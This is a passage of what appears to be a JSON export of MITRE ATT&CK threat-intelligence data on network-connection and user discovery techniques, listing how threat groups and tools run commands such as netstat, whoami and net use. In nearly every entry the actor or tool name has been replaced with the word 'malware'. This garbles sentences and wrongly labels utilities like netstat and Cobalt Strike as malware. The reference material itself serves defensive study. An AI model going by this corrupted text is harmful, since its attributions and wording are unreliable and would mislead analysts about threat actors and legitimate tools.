                "Name": "ZeroT",
                "Description": "malware gathers the victim's IP address and domain information, and then sends it to its C2 server.[267]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has used a tool to enumerate proxy settings in the target environment.[268]"
            },
            "S0350": {
                "ID": "S0350",
                "Name": "zwShell",
                "Description": "malware can obtain the victim IP address.[269]"
            }
        }
    },
    "T1049": {
        "ttp_name": "System Network Connections Discovery",
        "ttp_id": "T1049",
        "href": "/techniques/T1049",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.[1][2][3] Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.Utilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. show ip sockets, show tcp brief).[4]",
        "Procedure": {
            "G0018": {
                "ID": "G0018",
                "Name": "admin@338",
                "Description": "malware actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: netstat -ano >> %temp%\\download[5]"
            },
            "G0138": {
                "ID": "G0138",
                "Name": "Andariel",
                "Description": "malware has used the netstat -naop tcp command to display TCP connections on a victim's machine.[6]"
            },
            "G0006": {
                "ID": "G0006",
                "Name": "APT1",
                "Description": "malware used the net use command to get a listing on network connections.[7]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has a tool that can enumerate current network connections.[8][9][10]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware used the netstat -anpo tcp command to display TCP connections on the victim's machine.[11]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.[12]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware has enumerated IP addresses of network resources and used the netstat command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.[13][14]"
            },
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has used the BLOODMINE utility to collect data on web requests from Pulse Secure Connect logs.[15]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to gather TCP and UDP table status listings.[16]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware can use \"WNetOpenEnumW\" and \"WNetEnumResourceW\" to enumerate files in network resources for encryption.[17]"
            },
            "G0135": {
                "ID": "G0135",
                "Name": "BackdoorDiplomacy",
                "Description": "malware has used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports.[18]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can execute netstat.exe -f on a compromised machine.[19]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware has gathered information about local network connections using netstat.[20][21]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware uses the netstat -r and netstat -an commands.[22]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can use netsh wlan show profiles to list specific Wi-Fi profile details.[23]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used netstat -ano | findstr EST to discover network connections.[24]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can produce a sessions report from compromised hosts.[25]"
            },
            "S0244": {
                "ID": "S0244",
                "Name": "Comnie",
                "Description": "malware executes the netstat -ano command.[26]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can enumerate routine network connections from a compromised host.[27]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can discover active sessions for a targeted system.[28]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware can use the function GetIpNetTable to recover the last connections to the victim's machine.[29]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware can collect network and active connection information.[30]"
            },
            "S0038": {
                "ID": "S0038",
                "Name": "Duqu",
                "Description": "The discovery modules used with malware can collect information on network connections.[31]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware employed a PowerShell script called RDPConnectionParser to read and filter the Windows event log \"Microsoft-Windows-TerminalServices-RDPClient/Operational\"(Event ID 1024) to obtain network information from RDP connections. malware has also used netstat from a compromised system to obtain network connection information.[32]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware can enumerate all connected drives.[33]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can enumerate the current network connections of a host.[34]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware uses the net use, net session, and netstat commands to gather information on network connections.[35][36]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has used netstat and other net  commands for network reconnaissance efforts.[37]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has been used to execute netstat -ano on a compromised host.[38]"
            },
            "C0007": {
                "ID": "C0007",
                "Name": "FunnyDream",
                "Description": "During malware, the threat actors used netstat to discover network connections on remote systems.[39]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware used netstat -oan to obtain information about the victim network connections.[40]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware uses the netstat command to find open ports on the victim\u2019s machine.[41]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has used netstat to monitor connections to specific ports.[42]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can list network connections.[43]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware performs local network connection discovery using netstat.[44][45]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware has used net session on the victim's machine.[46]"
            },
            "S1075": {
                "ID": "S1075",
                "Name": "KOPILUWAK",
                "Description": "malware can use netstat, Arp, and Net to discover current TCP connections.[47]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects a list of active and listening connections by using the command netstat -nao as well as a list of available network mappings with net use.[48]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has used net use to identify and establish a network connection with a remote host.[49]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware has a plugin to retrieve information about all active network sessions on the infected server.[50]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can identify the IP and port numbers for all remote connections from the compromised host.[51]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware uses the netsh wlan show networks mode=bssid and netsh wlan show interfaces commands to list all nearby WiFi networks and connected interfaces.[52]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can use the GetExtendedTcpTable function to retrieve information about established TCP connections.[53]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used quser.exe to identify existing RDP connections.[54]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has used the \"WNetOpenEnumW\", \"WNetEnumResourceW\", \"WNetCloseEnum\" and \"WNetAddConnection2W\" functions to enumerate the network resources on the infected machine.[55]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used net use to conduct connectivity checks to machines.[56]"
            },
            "S0443": {
                "ID": "S0443",
                "Name": "MESSAGETAP",
                "Description": "After loading the keyword and phone data files, malware begins monitoring all network connections to and from the victim server. [57]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used a PowerShell backdoor to check for Skype connections on the target machine.[58]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has used netstat -ano to determine network connection information.[59]"
            },
            "S0102": {
                "ID": "S0102",
                "Name": "nbtstat",
                "Description": "malware can be used to discover current NetBIOS sessions."
            },
            "S0039": {
                "ID": "S0039",
                "Name": "Net",
                "Description": "Commands such as net use and net session can be used in malware to gather information about network connections from a particular host.[60]"
            },
            "S0104": {
                "ID": "S0104",
                "Name": "netstat",
                "Description": "malware can be used to enumerate local network connections, including active TCP connections and other network statistics.[61]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can capture session logon details from a compromised host.[62]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used netstat -an on a victim to get a listing of network connections.[63]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "malware was seen using NetSess to discover NetBIOS sessions.[64]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the net session, net use, and netstat commands as part of their advanced reconnaissance.[65]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors collected a list of open connections on the infected system using netstat and checks whether it has an internet connection.[66]"
            },
            "S0165": {
                "ID": "S0165",
                "Name": "OSInfo",
                "Description": "malware enumerates the current network connections similar to  net use .[8]"
            },
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "Once inside a Virtual Private Cloud, malware can attempt to identify DirectConnect, VPN, or VPC Peering.[67]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware has a module for enumerating TCP and UDP network connections and associated processes using the netstat command.[68]"
            },
            "G0033": {
                "ID": "G0033",
                "Name": "Poseidon Group",
                "Description": "malware obtains and saves information about victim network interfaces and addresses.[69]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware contains an implementation of netstat to enumerate TCP and UDP connections.[70]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware may collect active network connections by running netstat -an on a victim.[71]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware has a built-in utility command for netstat, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.[72]"
            },
            "S1032": {
                "ID": "S1032",
                "Name": "PyDCrypt",
                "Description": "malware has used netsh to find RPC connections on remote machines.[73]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can use netstat to enumerate current network connections.[74][75]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can use netstat to enumerate network connections.[76]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware uses netstat -ano to search for specific IP address ranges.[77]"
            },
            "S0153": {
                "ID": "S0153",
                "Name": "RedLeaves",
                "Description": "malware can enumerate drives and Remote Desktop sessions.[78]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware can obtain a list of active connections and open ports.[79]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured.[80][81]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to execute the netstat command.[82]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware used the Windows function GetExtendedUdpTable to detect connected UDP endpoints.[83]"
            },
            "S0063": {
                "ID": "S0063",
                "Name": "SHOTPUT",
                "Description": "malware uses netstat to list TCP connection status.[84]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware has retrieved a GUID associated with a present LAN connection on a compromised machine.[85]"
            },
            "S0633": {
                "ID": "S0633",
                "Name": "Sliver",
                "Description": "malware can collect network connection information.[86]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware can enumerate open ports on a victim machine.[87]"
            },
            "S0374": {
                "ID": "S0374",
                "Name": "SpeakUp",
                "Description": "malware uses the arp -a command. [88]"
            },
            "S0018": {
                "ID": "S0018",
                "Name": "Sykipot",
                "Description": "malware may use netstat -ano to display active network connections.[89]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has run netstat -anp to search for rival malware connections.[90] malware has also used libprocesshider to modify /etc/ld.so.preload.[91]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has used net use and netstat to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.[92]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has used netstat -anop tcp to discover TCP connections to compromised hosts.[93]"
            },
            "S0678": {
                "ID": "S0678",
                "Name": "Torisma",
                "Description": "malware can use WTSEnumerateSessionsW to monitor remote desktop connections.[94]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can use netstat to collect a list of network connections.[95]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has tested if the localhost network is available and other connection capability on an infected system using command scripts.[96]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.[35][97] malware RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call.[98]"
            },
            "S0452": {
                "ID": "S0452",
                "Name": "USBferry",
                "Description": "malware can use netstat and nbtstat to detect active network connections.[96]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware can gather information about TCP connection state.[99]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has used netstat -ano on compromised hosts to enumerate network connections.[100][101]"
            },
            "S0579": {
                "ID": "S0579",
                "Name": "Waterbear",
                "Description": "malware can use API hooks on GetExtendedTcpTable to retrieve a table containing a list of TCP endpoints available to the application.[102]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware uses netstat -aon to gather network connection information.[103]"
            }
        }
    },
    "T1033": {
        "ttp_name": "System Owner/User Discovery",
        "ttp_id": "T1033",
        "href": "/techniques/T1033",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Various utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.On network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.[1][2]",
        "Procedure": {
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware has the ability to collect the username from an infected host.[3]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can collect the username from the victim\u2019s machine.[4][5][6]"
            },
            "S0092": {
                "ID": "S0092",
                "Name": "Agent.btz",
                "Description": "malware obtains the victim username and saves it to a file.[7]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware has collected the user name from a compromised host using GetUserNameA.[8]"
            },
            "G0073": {
                "ID": "G0073",
                "Name": "APT19",
                "Description": "malware used an HTTP malware variant and a Port 22 malware variant to collect the victim\u2019s username.[9]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "An malware downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of \"System.\"[10]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware collected the victim's username and executed the whoami command on the victim's machine. malware executed shellcode to collect the username on the victim's machine. [11][12][13]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware identifies the victim username.[14]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.[15]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware used Remexi to collect usernames from the system.[16]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware has executed whoami commands, including using the WMIEXEC utility to execute this on remote machines.[17][18]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to identify the username on a compromised host.[19]"
            },
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware can check if the current user of a compromised system is an administrator. [20]"
            },
            "S1029": {
                "ID": "S1029",
                "Name": "AuTo Stealer",
                "Description": "malware has the ability to collect the username from an infected host.[3]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can collect the username from the victim\u2019s machine.[21]"
            },
            "S0414": {
                "ID": "S0414",
                "Name": "BabyShark",
                "Description": "malware has executed the whoami command.[22]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware collects the current username from the victim.[23]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can obtain logged user information from a compromised machine and can execute the command whoami.exe.[24]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can identify the username of the infected user.[25]"
            },
            "S0017": {
                "ID": "S0017",
                "Name": "BISCUIT",
                "Description": "malware has a command to gather the username from the system.[26]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware can utilize net use commands to discover the user name on a compromised host.[27]"
            },
            "S0521": {
                "ID": "S0521",
                "Name": "BloodHound",
                "Description": "malware can collect information on user sessions.[28]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware can collect the username on a compromised host.[29]"
            },
            "S0486": {
                "ID": "S0486",
                "Name": "Bonadan",
                "Description": "malware has discovered the username of the user running the backdoor.[30]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware can enumerate the username on a compromised host.[31]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware has the ability to identify the user name.[32]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 used whoami to gather information from victim machines.[33]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors collected whoami information via PowerShell scripts.[34]"
            },
            "S0351": {
                "ID": "S0351",
                "Name": "Cannon",
                "Description": "malware can gather the username from the system.[35]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware can collect the username from a victim machine.[36]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware can obtain a list of user accounts from a victim's machine.[37]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware has collected the username and UID from the infected machine.[38]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used the quser command to show currently logged on users.[39]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can retrieve the username from a targeted system.[40]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can identify the username on a compromised host.[41][42]"
            },
            "S1024": {
                "ID": "S1024",
                "Name": "CreepySnail",
                "Description": "malware can execute getUsername on compromised systems.[43]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can identify the user on a targeted system.[44][45][46]"
            },
            "S0498": {
                "ID": "S0498",
                "Name": "Cryptoistic",
                "Description": "malware can gather data on the user of a compromised host.[47]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware gathers the username from the victim\u2019s machine.[48]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware has collected the username from a victim machine.[49]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware enumerates and collects the username from the victim\u2019s machine.[50][13]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "A Linux version of malware checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. malware also gathers the username of the victim.[51]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware can collect the username from a compromised host.[52]"
            },
            "S1021": {
                "ID": "S1021",
                "Name": "DnsSystem",
                "Description": "malware can use the Windows user name to create a unique identification for infected users and systems.[53]"
            },
            "S0186": {
                "ID": "S0186",
                "Name": "DownPaper",
                "Description": "malware collects the victim username and sends it to the C2 server.[54]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware used the command query user on victim hosts.[55]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can obtain a list of users from an infected machine.[56]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware has the ability to identify the users on a compromised host.[57]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware collected information on user accounts via the whoami command.[58]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware has used tools to gather information about users.[59]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has enumerated all users connected to network shares."
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can enumerate the username on targeted hosts.[60]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware collects the user name from the victim\u2019s machine.[61]"
            },
            "S0568": {
                "ID": "S0568",
                "Name": "EVILNUM",
                "Description": "malware can obtain the username from the victim's machine.[62]"
            },
            "S0401": {
                "ID": "S0401",
                "Name": "Exaramel for Linux",
                "Description": "malware can run whoami to identify the system owner.[63]"
            },
            "S0569": {
                "ID": "S0569",
                "Name": "Explosive",
                "Description": "malware has collected the username from the infected host.[64]"
            },
            "S0171": {
                "ID": "S0171",
                "Name": "Felismus",
                "Description": "malware collects the current username and sends it to the C2 server.[65]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware collects the username from the victim\u2019s machine.[66][67]"
            },
            "G0051": {
                "ID": "G0051",
                "Name": "FIN10",
                "Description": "malware has used Meterpreter to enumerate users on remote systems.[68]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has used the command cmd.exe /C quser to collect user session information.[69]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has executed the command quser to display the session details of a compromised machine.[70]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has been used to run the whoami command on the system.[71]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware enumerates the current user during the initial infection.[72][73]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors used Empire to enumerate hosts and gather username, machine name, and administrative permissions information.[60]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware has the ability to gather user information from the targeted system using whoami/upn&whoami/fqdn&whoami/logonid&whoami/all.[74]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware used whoami and query user to obtain information about the victim user.[75]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "A malware file stealer can gather the victim's username to send to a C2 server.[76]"
            },
            "S0168": {
                "ID": "S0168",
                "Name": "Gazer",
                "Description": "malware obtains the current user's security identifier.[77]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware has the ability to distinguish between a standard user and an administrator on a compromised host.[40]"
            },
            "S0460": {
                "ID": "S0460",
                "Name": "Get2",
                "Description": "malware has the ability to identify the current username of an infected host.[78]"
            },
            "S0249": {
                "ID": "S0249",
                "Name": "Gold Dragon",
                "Description": "malware collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.[79]"
            },
            "S0477": {
                "ID": "S0477",
                "Name": "Goopy",
                "Description": "malware has the ability to enumerate the infected system's user name.[13]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can collect the username from the victim's machine.[80]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware collects the victim username along with other account information (account type, description, full name, SID and status).[81]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware can identify the user id on a target machine.[82]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has used whoami to gather user information.[83]"
            },
            "S0214": {
                "ID": "S0214",
                "Name": "HAPPYWORK",
                "Description": "can collect the victim user name.[84]"
            },
            "S0391": {
                "ID": "S0391",
                "Name": "HAWKBALL",
                "Description": "malware can collect the user name of the system.[85]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has run whoami on compromised machines to identify the current user.[86]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to collect the username on the infected host.[87]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware lists local users and session information.[88]"
            },
            "S0015": {
                "ID": "S0015",
                "Name": "Ixeshe",
                "Description": "malware collects the username from the victim\u2019s machine.[89]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can obtain the victim user name.[90]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware gathers information on users.[91]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has used implants capable of collecting the signed-in username.[92]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can identify logged in users across the domain and views user sessions.[93][94]"
            },
            "S0162": {
                "ID": "S0162",
                "Name": "Komplex",
                "Description": "The OsInfo function in malware collects the current running username.[95]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware can collect the username from the victim\u2019s machine.[96]"
            },
            "S1075": {
                "ID": "S1075",
                "Name": "KOPILUWAK",
                "Description": "malware can conduct basic network reconnaissance on the victim machine with whoami, to get user details.[97]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects registered owner details by using the commands systeminfo and net config workstation.[98]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "Various malware malware enumerates logged-on users.[99][100][101][102][103][47][104]"
            },
            "S0362": {
                "ID": "S0362",
                "Name": "Linux Rabbit",
                "Description": "malware opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain. [105]"
            },
            "S0513": {
                "ID": "S0513",
                "Name": "LiteDuke",
                "Description": "malware can enumerate the account name on a targeted system.[106]"
            },
            "S0680": {
                "ID": "S0680",
                "Name": "LitePower",
                "Description": "malware can determine if the current user has admin privileges.[107]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can collect the username from the system.[108]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has the ability to discover the username on the infected host.[109]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware has the ability to identify the username on a compromised host.[110]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has used a malicious DLL to collect the username from compromised hosts.[111]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware can collect the username from the compromised machine.[112]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can collect the username from a compromised host.[113]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware malware has obtained the victim username and sent it to the C2 server.[114][115][116]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can retrieve the victim\u2019s username.[117]"
            },
            "S0459": {
                "ID": "S0459",
                "Name": "MechaFlounder",
                "Description": "malware has the ability to identify the username and hostname on a compromised host.[118]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can collect the username from a compromised host.[113]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has collected the username from the victim's machine.[119]"
            },
            "S0339": {
                "ID": "S0339",
                "Name": "Micropsia",
                "Description": "malware collects the username from the victim\u2019s machine.[120]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware can identify users registered to a targeted machine.[121]"
            },
            "S0280": {
                "ID": "S0280",
                "Name": "MirageFox",
